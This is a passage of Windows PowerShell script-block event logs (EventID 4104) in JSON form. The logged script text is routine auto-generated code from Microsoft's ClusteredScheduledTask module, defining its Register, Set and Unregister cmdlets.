    "ScriptBlockText": "werShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByXml', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Register-ClusteredScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Set-ClusteredScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Params', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=2)]\r\n    [Parameter(ParameterSetName='Params', Position=5)]\r\n    [Parameter(ParameterSetName='Xml', Position=2)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Cluster},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=1, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=1)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=1, ValueFromPipeline=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Xml},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Params') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n  ",
    "ScriptBlockId": "d312e26e-f2a9-4ba0-95bc-bdbc730b6055",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.436407Z"
    },
    "EventRecordID": 93,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-5C9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 5,
    "MessageTotal": 6,
    "ScriptBlockText": "      [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByParams', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Xml') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Xml')) {\r\n          [object]$__cmdletization_value = ${Xml}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByXml', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeen",
    "ScriptBlockId": "d312e26e-f2a9-4ba0-95bc-bdbc730b6055",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:23.436427Z"
    },
    "EventRecordID": 94,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0001-5C9F-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5908,
      "ThreadID": 2524
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 6,
    "MessageTotal": 6,
    "ScriptBlockText": "Thrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-ClusteredScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Unregister-ClusteredScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Cluster},\r\n\r\n    [Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('UnregisterByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('UnregisterByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n  